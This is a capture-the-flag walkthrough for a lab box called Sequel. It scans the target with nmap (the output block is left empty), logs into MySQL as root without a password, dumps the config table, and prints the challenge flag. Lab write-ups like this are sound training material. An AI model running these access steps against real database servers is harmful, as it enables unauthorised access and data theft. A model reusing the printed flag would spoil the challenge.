# CTF Walkthrough: Sequel

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Steps](#2-steps)

---

## 1. Introduction

**Category:** MySQL        
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Steps

1. Service Enumeration
    - Command: `nmap -sV -sC 10.129.20.114`
        - Output:
            ```
            
            ```

2. Log in to MySQL as root
    - Command: `mysql -u root -h 10.129.20.114 --skip-ssl`


3. In MySQL
    - Show all available databases
        - Command: `show databases;`
            - Output:
            ```
            +--------------------+
            | Database           |
            +--------------------+
            | htb                |
            | information_schema |
            | mysql              |
            | performance_schema |
            +--------------------+
            ```
    - Select htb database
        - Command: `use htb;`
            
    - Show all tables
        - Command: `show tables;`
            - Output:
            ```
            +---------------+
            | Tables_in_htb |
            +---------------+
            | config        |
            | users         |
            +---------------+
            ```
    - Describe config table
        - Command: `describe config;`
            - Output:
            ```
            +-------+---------------------+------+-----+---------+----------------+
            | Field | Type                | Null | Key | Default | Extra          |
            +-------+---------------------+------+-----+---------+----------------+
            | id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
            | name  | text                | YES  |     | NULL    |                |
            | value | text                | YES  |     | NULL    |                |
            +-------+---------------------+------+-----+---------+----------------+
            ```
    - Show contents of config table
        - Command: `select * from config;`
            - Output:
            ```
            +----+-----------------------+----------------------------------+
            |  1 | timeout               | 60s                              |
            |  2 | security              | default                          |
            |  3 | auto_logon            | false                            |
            |  4 | max_size              | 2M                               |
            |  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
            |  6 | enable_uploads        | false                            |
            |  7 | authentication_method | radius                           |
            +----+-----------------------+----------------------------------+
            ```

4. Get Flag
    - Flag : 7b4bec00d1a39e3dd4e021ec3d915da8

